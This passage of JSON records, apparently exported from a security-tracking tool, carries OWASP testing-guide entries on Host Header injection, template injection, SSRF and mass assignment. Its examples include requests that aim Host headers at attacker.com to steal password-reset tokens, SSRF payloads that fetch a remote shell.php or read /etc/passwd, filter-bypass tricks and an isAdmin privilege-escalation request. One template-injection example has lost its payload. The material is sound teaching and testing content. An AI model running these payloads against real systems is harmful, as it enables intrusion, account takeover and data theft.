Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-17 Testing for Host Header Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"A web server commonly hosts several web applications on the same IP address, referring to each application via the virtual host. In an incoming HTTP request, web servers often dispatch the request to the target virtual host based on the value supplied in the Host header. Without proper validation of the header value, the attacker can supply invalid input to cause the web server to:\n\n* Dispatch requests to the first virtual host on the list.\n* Perform a redirect to an attacker-controlled domain.\n* Perform web cache poisoning.\n* Manipulate password reset functionality.\n* Allow access to virtual hosts that were not intended to be externally accessible.","TestingInstructions":"## Test Objectives\n\n* Assess if the Host header is being parsed dynamically in the application.\n* Bypass security controls that rely on the header.\n\n## How to Test\n\nInitial testing is as simple as supplying another domain (i.e. \u0060attacker.com\u0060) into the Host header field. It is how the web server processes the header value that dictates the impact. The attack is valid when the web server processes the input to send the request to an attacker-controlled host that resides at the supplied domain, and not to an internal virtual host that resides on the web server.\n\n\u0060\u0060\u0060\nGET / HTTP/1.1\nHost: www.attacker.com\n[...]\n\u0060\u0060\u0060\n\nIn the simplest case, this may cause a 302 redirect to the supplied domain.\n\n\u0060\u0060\u0060\nHTTP/1.1 302 Found\n[...]\nLocation: http://www.attacker.com/login.php\n\n\u0060\u0060\u0060\n\nAlternatively, the web server may send the request to the first virtual host on the list.\n\n### X-Forwarded Host Header Bypass\n\nIn the event that Host header injection is mitigated by checking for invalid input injected via the Host header, you can supply the value to the \u0060X-Forwarded-Host\u0060 header.\n\n\u0060\u0060\u0060\nGET / HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: www.attacker.com\n[...]\n\u0060\u0060\u0060\n\nPotentially producing client-side output such as:\n\n\u0060\u0060\u0060\n[...]\n\u003Clink src=\u0022http://www.attacker.com/link\u0022 /\u003E\n[...]\n\u0060\u0060\u0060\n\nOnce again, this depends on how the web server processes the header value.\n\n### Web Cache Poisoning\n\nUsing this technique, an attacker can manipulate a web-cache to serve poisoned content to anyone who requests it. This relies on the ability to poison the caching proxy run by the application itself, CDNs, or other downstream providers. As a result, the victim will have no control over receiving the malicious content when requesting the vulnerable application.\n\n\u0060\u0060\u0060\nGET / HTTP/1.1\nHost: www.attacker.com\n[...]\n\u0060\u0060\u0060\n\nThe following will be served from the web cache, when a victim visits the vulnerable application.\n\n\u0060\u0060\u0060\n[...]\n\u003Clink src=\u0022http://www.attacker.com/link\u0022 /\u003E\n[...]\n\u0060\u0060\u0060\n\n### Password Reset Poisoning\n\nIt is common for password reset functionality to include the Host header value when creating password reset links that use a generated secret token. If the application processes an attacker-controlled domain to create a password reset link, the victim may click on the link in the email and allow the attacker to obtain the reset token, thus resetting the victim\u2019s password.\nThe example below shows a password reset link that is generated in PHP using the value of \u0060$_SERVER[\u0027HTTP_HOST\u0027]\u0060, which is set based on the contents of the HTTP Host header:\n\n\u0060\u0060\u0060\n$reset_url = \u0022https://\u0022 . $_SERVER[\u0027HTTP_HOST\u0027] . \u0022/reset.php?token=\u0022 .$token;\nsend_reset_email($email,$rset_url);\n\u0060\u0060\u0060\n\nBy making a HTTP request to the password reset page with a tampered Host header, we can modify where the URL points:\n\n\u0060\u0060\u0060\nPOST /request_password_reset.php HTTP/1.1\nHost: www.attacker.com\n[...]\n\nemail=user@example.org\n\u0060\u0060\u0060\n\nThe specified domain (\u0060www.attacker.com\u0060) will then be used in the reset link, which is emailed to the user. When the user clicks this link, the attacker can steal the token and compromise their account.\n\n\u0060\u0060\u0060\n... Email snippet ...\n\nClick on the following link to reset your password:\n\nhttps://www.attacker.com/reset.php?token=12345\n\n... Email snippet ...\n\u0060\u0060\u0060\n\n### Accessing Private Virtual Hosts\n\nIn some cases a server may have virtual hosts that are not intended to be externally accessible. This is most common with a [split-horizon](https://en.wikipedia.org/wiki/Split-horizon_DNS) DNS setup (where internal and external DNS servers return different records for the same domain).\nFor example, an organization may have a single webserver on their internal network, which hosts both their public website (on \u0060www.example.org\u0060) and their internal Intranet (on \u0060intranet.example.org\u0060, but that record only exists on the internal DNS server). Although it would not be possible to browse directly to \u0060intranet.example.org\u0060 from outside the network (as the domain would not resolve), it may be possible to access to Intranet by making a request from outside with the following \u0060Host\u0060 header:\n\n\u0060\u0060\u0060\nHost: intranet.example.org\n\u0060\u0060\u0060\n\nThis could also be achieved by adding an entry for \u0060intranet.example.org\u0060 to your hosts file with the public IP address of \u0060www.example.org\u0060, or by overriding DNS resolution in your testing tool.","Details":null,"Implication":null,"Recommendation":null,"References":"* [What is a Host Header Attack?](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/)\n* [Host Header Attack](https://www.briskinfosec.com/blogs/blogsdetail/Host-Header-Attack)\n* [HTTP Host header attacks](https://portswigger.net/web-security/host-header)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-18 Testing for Server-side Template Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nWeb applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.\n\n### Example - Twig\n\nThe following example is an excerpt from the [Extreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa) project.\n\n\u0060\u0060\u0060\npublic function getFilter($name)\n{\n        [snip]\n        foreach ($this-\u003EfilterCallbacks as $callback) {\n        if (false !== $filter = call_user_func($callback, $name)) {\n            return $filter;\n        }\n    }\n    return false;\n}\n\u0060\u0060\u0060\n\nIn the getFilter function the \u0060call_user_func($callback, $name)\u0060 is vulnerable to SSTI: the \u0060name\u0060 parameter is fetched from the HTTP GET request and executed by the server:\n![SSTI XVWA Example](Image Not Found)\n*Figure 4.7.18-1: SSTI XVWA Example*\n\n### Example - Flask/Jinja2\n\nThe following example uses Flask and Jinja2 templating engine. The \u0060page\u0060 function accepts a \u2018name\u2019 parameter from an HTTP GET request and renders an HTML response with the \u0060name\u0060 variable content:\n\n\u0060\u0060\u0060\n@app.route(\u0022/page\u0022)\ndef page():\n    name = request.values.get(\u0027name\u0027)\n    output = Jinja2.from_string(\u0027Hello \u0027 \u002B name \u002B \u0027!\u0027).render()\n    return output\n\u0060\u0060\u0060\n\nThis code snippet is vulnerable to XSS but it is also vulnerable to SSTI. Using the following as a payload in the \u0060name\u0060 parameter:\n\n\u0060\u0060\u0060\n$ curl -g \u0027http://www.target.com/page?name=\u0027\nHello 49!\n\u0060\u0060\u0060\n\n\n\u003Cbr\u003E\n","TestingInstructions":"## Test Objectives\n\n* Detect template injection vulnerability points.\n* Identify the templating engine.\n* Build the exploit.\n\n## How to Test\n\nSSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform \u2018text\u2019 with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)\n\n### Identify Template Injection Vulnerability\n\nThe first step in testing SSTI in plaintext context is to construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.\nCommon template expression examples:\n\n\u0060\u0060\u0060\nab\na\n{var} ${var}  \u003C%var%\u003E [% var %]\n\u0060\u0060\u0060\n\nIn this step an extensive [template expression test strings/payloads list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) is recommended.\nTesting for SSTI in code context is slightly different. First, the tester constructs the request that result either blank or error server responses. In the example below the HTTP GET parameter is inserted info the variable \u0060personal_greeting\u0060 in a template statement:\n\n\u0060\u0060\u0060\npersonal_greeting=username\nHello user01\n\u0060\u0060\u0060\n\nUsing the following payload - the server response is blank \u201CHello\u201D:\n\n\u0060\u0060\u0060\npersonal_greeting=username\u003Ctag\u003E\nHello\n\u0060\u0060\u0060\n\nIn the next step is to break out of the template statement and injecting HTML tag after it using the following payload\n\n\u0060\u0060\u0060\npersonal_greeting=username}}\u003Ctag\u003E\nHello user01 \u003Ctag\u003E\n\u0060\u0060\u0060\n\n### Identify the Templating Engine\n\nBased on the information from the previous step now the tester has to identify which template engine is used by supplying various template expressions. Based on the server responses the tester deduces the template engine used. This manual approach is discussed in greater detail in [this](https://portswigger.net/blog/server-side-template-injection?#Identify) PortSwigger article. To automate the identification of the SSTI vulnerability and the templating engine various tools are available including [Tplmap](https://github.com/epinna/tplmap) or the [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner).\n\n### Build the RCE Exploit\n\nThe main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template documentation and research. Key areas of interest are:\n\n* **For template authors** sections covering basic syntax.\n* **Security considerations** sections.\n* Lists of built-in methods, functions, filters, and variables.\n* Lists of extensions/plugins.\n\nThe tester can also identify what other objects, methods and properties can be exposed by focusing on the \u0060self\u0060 object. If the \u0060self\u0060 object is not available and the documentation does not reveal the technical details, a brute force of the variable name is recommended. Once the object is identified the next step is to loop through the object to identify all the methods, properties and attributes that are accessible through the template engine. This could lead to other kinds of security findings including privilege escalations, information disclosure about application passwords, API keys, configurations and environment variables, etc.\n\n## Tools\n\n* [Tplmap](https://github.com/epinna/tplmap)\n* [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner)\n* [Template expression test strings/payloads list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)","Details":null,"Implication":null,"Recommendation":null,"References":"* [James Kettle: Server-Side Template Injection:RCE for the modern webapp (whitepaper)](https://portswigger.net/kb/papers/serversidetemplateinjection.pdf)\n* [Server-Side Template Injection](https://portswigger.net/blog/server-side-template-injection)\n* [Exploring SSTI in Flask/Jinja2](https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/)\n* [Server Side Template Injection: from detection to Remote shell](https://www.okiok.com/server-side-template-injection-from-detection-to-remote-shell/)\n* [Extreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa)\n* [Divine Selorm Tsa: Exploiting server side template injection with tplmap](https://owasp.org/www-pdf-archive/Owasp_SSTI_final.pdf)\n* [Exploiting SSTI in Thymeleaf](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-19 Testing for Server-Side Request Forgery","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).","TestingInstructions":"## Test Objectives\n\n* Identify SSRF injection points.\n* Test if the injection points are exploitable.\n* Asses the severity of the vulnerability.\n\n## How to Test\n\nWhen testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.\nConsider the following request:\n\n\u0060\u0060\u0060\nGET https://example.com/page?page=about.php\n\u0060\u0060\u0060\n\nYou can test this request with the following payloads.\n\n### Load the Contents of a File\n\n\u0060\u0060\u0060\nGET https://example.com/page?page=https://malicioussite.com/shell.php\n\u0060\u0060\u0060\n\n### Access a Restricted Page\n\n\u0060\u0060\u0060\nGET https://example.com/page?page=http://localhost/admin\n\u0060\u0060\u0060\n\nOr:\n\n\u0060\u0060\u0060\nGET https://example.com/page?page=http://127.0.0.1/admin\n\u0060\u0060\u0060\n\nUse the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the \u0060admin\u0060 page.\nThese kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.\n\n### Fetch a Local File\n\n\u0060\u0060\u0060\nGET https://example.com/page?page=file:///etc/passwd\n\u0060\u0060\u0060\n\n### HTTP Methods Used\n\nAll of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.\nOne important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.\nYou can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery#references).\n\n### PDF Generators\n\nIn some cases, a server may convert uploaded files to PDF format. Try injecting \u0060\u003Ciframe\u003E\u0060, \u0060\u003Cimg\u003E\u0060, \u0060\u003Cbase\u003E\u0060, or \u0060\u003Cscript\u003E\u0060 elements, or CSS \u0060url()\u0060 functions pointing to internal services.\n\n\u0060\u0060\u0060\n\u003Ciframe src=\u0022file:///etc/passwd\u0022 width=\u0022400\u0022 height=\u0022400\u0022\u003E\n\u003Ciframe src=\u0022file:///c:/windows/win.ini\u0022 width=\u0022400\u0022 height=\u0022400\u0022\u003E\n\u0060\u0060\u0060\n\n### Common Filter Bypass\n\nSome applications block references to \u0060localhost\u0060 and \u0060127.0.0.1\u0060. This can be circumvented by:\n\n* Using alternative IP representation that evaluate to \u0060127.0.0.1\u0060:\n    * Decimal notation: \u00602130706433\u0060\n    * Octal notation: \u0060017700000001\u0060\n    * IP shortening: \u0060127.1\u0060\n* String obfuscation\n* Registering your own domain that resolves to \u0060127.0.0.1\u0060\n\nSometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).\n\n* Using the \u0060@\u0060 character to separate between the userinfo and the host: \u0060https://expected-domain@attacker-domain\u0060\n* URL fragmentation with the \u0060#\u0060 character: \u0060https://attacker-domain#expected-domain\u0060\n* URL encoding\n* Fuzzing\n* Combinations of all of the above\n\nFor additional payloads and bypass techniques, see the [references](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery#references) section.","Details":null,"Implication":null,"Recommendation":"SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).","References":"* [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)\n* [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)\n* [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)\n* [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)\n* [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)\n* [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)\n* [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)\n* [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)\n* [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)\n* [URI Generic Syntax](https://tools.ietf.org/html/rfc3986)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-20 Testing for Mass Assignment","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Modern web applications are very often based on frameworks. Many of these web application frameworks allow automatic binding of user input (in the form of HTTP request parameters) to internal objects. This is often called autobinding. This feature can be sometimes exploited to access fields that were never intended to be modified from outside leading to privilege escalation, data tampering, bypass of security mechanisms, and more. In this case there is a Mass Assignment vulnerability.\nExamples of sensitive properties:\n\n* **Permission-related properties**: should only be set by privileged users (e.g. \u0060is_admin\u0060, \u0060role\u0060, \u0060approved\u0060).\n* **Process-dependent properties**: should only be set internally, after a process is completed (e.g. \u0060balance\u0060, \u0060status\u0060, \u0060email_verified\u0060)\n* **Internal properties**: should only be set internally by the application (e.g. \u0060created_at\u0060, \u0060updated_at\u0060)","TestingInstructions":"## Test Objectives\n\n* Identify requests that modify objects\n* Assess if it is possible to modify fields never intended to be modified from outside\n\n## How to Test\n\nThe following is a classic example that can help to illustrate the issue.\nSuppose a Java web application with a \u0060User\u0060 object similar to the following:\n\n\u0060\u0060\u0060\npublic class User {\n   private String username;\n   private String password;\n   private String email;\n   private boolean isAdmin;\n\n   //Getters \u0026 Setters\n}\n\u0060\u0060\u0060\n\nTo create a new \u0060User\u0060 the web application implements the following view:\n\n\u0060\u0060\u0060\n\u003Cform action=\u0022/createUser\u0022 method=\u0022POST\u0022\u003E\n     \u003Cinput name=\u0022username\u0022 type=\u0022text\u0022\u003E\n     \u003Cinput name=\u0022password\u0022 type=\u0022text\u0022\u003E\n     \u003Cinput name=\u0022email\u0022 text=\u0022text\u0022\u003E\n     \u003Cinput type=\u0022submit\u0022 value=\u0022Create\u0022\u003E\n\u003C/form\u003E\n\u0060\u0060\u0060\n\nThe controller that handles the creation request (Spring provides the automatic bind with the \u0060User\u0060 model):\n\n\u0060\u0060\u0060\n@RequestMapping(value = \u0022/createUser\u0022, method = RequestMethod.POST)\npublic String createUser(User user) {\n   userService.add(user);\n   return \u0022successPage\u0022;\n}\n\u0060\u0060\u0060\n\nWhen the form is submitted, the following request is generated by the browser:\n\n\u0060\u0060\u0060\nPOST /createUser\n[...]\nusername=bob\u0026password=supersecretpassword\u0026email=bob@domain.test\n\u0060\u0060\u0060\n\nHowever, due to the autobinding, an attacker can add the \u0060isAdmin\u0060 parameter to the request, which the controller will automatically bind to the model.\n\n\u0060\u0060\u0060\nPOST /createUser\n[...]\nusername=bob\u0026password=supersecretpassword\u0026email=bob@domain.test\u0026isAdmin=true\n\u0060\u0060\u0060\n\nThe user is then created with the \u0060isAdmin\u0060 property set to \u0060true\u0060, giving them administrative rights on the application.\n\n### Black-Box Testing\n\n#### Detect Handlers\n\nIn order to determine which part of the application is vulnerable to mass assignment, enumerate all parts of the application that accept content from the user and can potentially be mapped with a model. This includes all HTTP requests (most likely GET, POST, and PUT) that appear to allow create or update operations on the back end. One of the most simple indicators for potential mass assignments is the presence of bracket syntax for input parameter names, as for example:\n\n\u0060\u0060\u0060\n\u003Cinput name=\u0022user[name]\u0022 type=\u0022text\u0022\u003E\n\u0060\u0060\u0060\n\nWhen such patterns are encountered try to add an input related to a non-exiting attribute (e.g. \u0060user[nonexistingattribute]\u0060) and analyze the response/behavior. If the application does not implement any control (e.g. list of allowed fields) it is likely that it will respond with an error (e.g. 500) due to the fact that the application does not find the attribute associated to the object. More interestingly, those errors sometimes facilitate discovery of attribute names and value data types needed to exploit the issue, without access to the source code.\n\n#### Identify Sensitive Fields\n\nSince in black-box testing the tester does not have visibility on the source code, it is necessary to find other ways in order to gather information about the attributes associated to the objects. Analyze the responses received by the back end, in particular pay attention to:\n\n* HTML page source code\n* Custom JavaScript code\n* API responses\n\nFor example, very often, it is possible to exploit handlers that return details about an object in order to gather clues on the associated fields. Suppose for example a handler that returns the profile of the user (e.g. \u0060GET /profile\u0060), this may include further attributes related to the user (in this example the \u0060isAdmin\u0060 attribute looks particularly interesting).\n\n\u0060\u0060\u0060\n{\u0022_id\u0022:12345,\u0022username\u0022:\u0022bob\u0022,\u0022age\u0022:38,\u0022email\u0022:\u0022bob@domain.test\u0022,\u0022isAdmin\u0022:false}\n\u0060\u0060\u0060\n\nThen try to exploit handlers that allow the modification or creation of users, adding the \u0060isAdmin\u0060 attribute configured to \u0060true\u0060.\nAnother approach is to use wordlists in order to try to enumerate all the potential attributes. The enumeration can then be automated (e.g. via wfuzz, Burp Intruder, ZAP fuzzer, etc.). The sqlmap tool includes a [common-columns.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-columns.txt) wordlist that can be useful to identify potential sensitive attributes. A small example of common interesting attribute names are the following:\n\n* \u0060is_admin\u0060\n* \u0060is_administrator\u0060\n* \u0060isAdmin\u0060\n* \u0060isAdministrator\u0060\n* \u0060admin\u0060\n* \u0060administrator\u0060\n* \u0060role\u0060\n\nWhen multiple roles are available try to compare requests made by different user levels (pay particular attention to privileged roles). For example, if extra parameters are included in requests made by an administrative user, try those as a low privileged/anonymous user.\n\n#### Check Impact\n\nThe impact of a mass assignment can vary depending on the context therefore, for each test input attempted in the previous phase, analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application\u2019s security. For example, the modification of the \u0060id\u0060 of an object can lead to application Denial of Service or privilege escalation. Another example is related to the possibility to modify the role/status of the user (e.g. \u0060role\u0060 or \u0060isAdmin\u0060) leading to vertical privilege escalation.\n\n### Gray-Box Testing\n\nWhen the analysis is performed with a gray-box testing approach, it is possible to follow the same methodology to verify the issue. However, the greater knowledge on the application allows to more easily identify frameworks and handlers subject to mass assignment vulnerability. In particular, when the source code is available, it is possible to search the input vectors more easily and accurately. During a source code review, use simple tools (such as the grep command) to search for one or more common patterns within the application code. Access to the DB schema or to the source code allows also to easily identify sensitive fields.\n\n#### Java\n\nSpring MVC allows to automatically bind user input into object. Identify the controllers that handle state-changing requests (e.g. find the occurrences of \u0060@RequestMapping\u0060) then verify if controls are in place (both on the controller or on the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:\n\n* list of bindable fields via \u0060setAllowedFields\u0060 method of the \u0060DataBinder\u0060 class (e.g. \u0060binder.setAllowedFields([\u0022username\u0022,\u0022password\u0022,\u0022email\u0022])\u0060)\n* list of non-bindable fields via \u0060setDisallowedFields\u0060 method of the \u0060DataBinder\u0060 class (e.g. \u0060binder.setDisallowedFields([\u0022isAdmin\u0022])\u0060)\n\nIt is also advisable to pay attention to the use of the \u0060@ModelAttribute\u0060 annotation that allows to specify a different name/key.\n\n#### PHP\n\nLaravel Eloquent ORM provides a \u0060create\u0060 method which allows automatic assignment of attributes. However, the latest versions of Eloquent ORM provide default protection against mass assignment vulnerabilities requiring to explicitly specify allowed attributes that can be assigned automatically, through the \u0060$fillable\u0060 array, or attributes that have to be protected (non-bindable), trough the \u0060$guarded\u0060 array. Therefore by analyzing the models (classes that extend the \u0060Model\u0060 class) it is possible to identify which attributes are allowed or denied and therefore point out potential vulnerabilities.\n\n#### .NET\n\nModel binding in ASP.NET automatically bind user inputs to object properties. This also works with complex types and it will automatically convert the input data to the properties if the properties\u2019 names match with the input. Identify the controllers then verify if controls are in place (both inside the controller or in the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:\n\n* fields declared as \u0060ReadOnly\u0060\n* list of bindable fields via \u0060Bind\u0060 attribute (e.g. \u0060[Bind(Include = \u0022FirstName, LastName\u0022)] Student std\u0060), via \u0060includeProperties\u0060 (e.g. \u0060includeProperties: new[] { \u0022FirstName, LastName\u0022 }\u0060) or through \u0060TryUpdateModel\u0060\n* list of non-bindable fields via \u0060Bind\u0060 attribute (e.g. \u0060[Bind(Exclude = \u0022Status\u0022)] Student std\u0060) or via \u0060excludeProperties\u0060 (e.g. \u0060excludeProperties: new[] { \u0022Status\u0022 }\u0060)","Details":null,"Implication":null,"Recommendation":"Use built-in features, provided by frameworks, to define bindable and non-bindable fields. An approach based on allowed fields (bindable), in which only the properties that should be updated by the user are explicitly defined, is preferable. An architectural approach to prevent the issue is to use the *Data Transfer Object* (DTO) pattern in order to avoid direct binding. The DTO should include only the fields that are meant to be editable by the user.","References":"* [OWASP: API Security](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa6-mass-assignment.md)\n* [OWASP: Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation 